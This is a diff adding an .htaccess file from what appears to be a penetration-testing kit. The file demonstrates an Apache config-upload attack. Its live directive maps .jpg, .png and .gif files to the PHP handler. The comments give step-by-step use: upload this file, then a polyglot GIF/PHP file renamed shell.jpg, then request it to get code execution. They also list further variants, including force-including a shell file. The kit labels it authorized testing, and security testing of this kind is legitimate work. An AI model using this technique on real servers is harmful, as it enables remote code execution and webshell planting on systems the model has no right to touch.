@@ -1,0 +1,27 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# Apache config-upload PoC - x8bitranjit lab style. Authorized testing only.
+#
+# WHAT THIS DEMONSTRATES: if a platform lets you upload a file named
+# .htaccess into a SERVED directory, you redefine how the server executes
+# files there - every following "image" becomes executable PHP.
+#
+# WHERE TO USE: any upload endpoint storing to a web-served directory on
+# Apache (AllowOverride not None). Upload THIS file first, then upload
+# upload_polyglot_gif_php.gif (from this folder) as "shell.jpg", then:
+#   GET /uploads/shell.jpg  ->  PHP executes, benign marker prints.
+#
+# WHAT TO EDIT: nothing - shipped benign (marker echo only). The payload
+# PHP is in upload_polyglot_gif_php.gif.
+#
+# VARIANTS:
+#   AddType application/x-httpd-php .abc          # map a new extension
+#   php_value auto_prepend_file /var/www/html/up/shell.gif   # force-include
+#   AddOutputFilter INCLUDES .jpg                 # SSI in jpg
+#
+# CONFIRM: marker text appears in the response. CLEANUP: delete BOTH files
+# (config + payload) - ledger it (POST_EXPLOITATION_CHECKLIST PEXP-015).
+# KIT CROSS-REF: UPL-009 (config-file upload), UPL-010 (benign webshell).
+# ============================================================================
+
+AddType application/x-httpd-php .jpg .png .gif
